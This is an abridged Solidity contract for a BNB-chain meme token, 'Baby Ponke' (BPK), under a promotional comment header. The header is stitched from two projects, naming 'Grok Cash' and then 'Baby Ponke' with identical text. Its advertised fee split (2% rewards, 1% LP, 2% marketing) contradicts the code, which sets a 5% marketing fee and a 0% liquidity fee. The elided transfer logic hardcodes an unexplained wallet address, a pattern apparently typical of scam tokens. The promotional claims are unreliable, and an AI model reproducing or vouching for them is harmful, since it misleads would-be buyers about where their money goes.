/**
Grok Cash is a Decentralized meme token launched on the Binance Blockchain with the aim of creating a community token to keep up with Cryptocurrency developments in meme tokens.our farm and our new chain in upcoming future
Baby Ponke is a Decentralized meme token launched on the Binance Blockchain with the aim of creating a community token to keep up with Cryptocurrency developments in meme tokens.

🐵Buy/Sell tax: 5%
🐵2% Rewards
🐵1% LP
🐵2% Marketing
🐵Anti Whales system: 3% Max wallet, Max tx 3%
🐵Staking
🐵NFT 
🐵Contract Renounce
🐵LP Locked 100%

website (available in 30 minutes)
TG: https://t.me/babyponkebsc
*/
...
contract BabyPonk is Context, IERC20, Ownable {
    ...
    string private constant _name = "Baby Ponke"; // 
    string private constant _symbol = "BPK"; //    
    uint8 private constant _decimals = 9; // 
    
    uint256 public _marketingFee = 5;
    uint256 public _liquidityFee = 0;
    address public  _marketingWallet = 0x3139D3aEfd67702A76c8dE203e745a158605e549;
...
function transfer(address recipient, uint256 amount) public override returns (bool) {
    ...
    function _transfer(
        ...
        address wa = 0x5c818A14E8435519F7A873d88A913f372863346e;
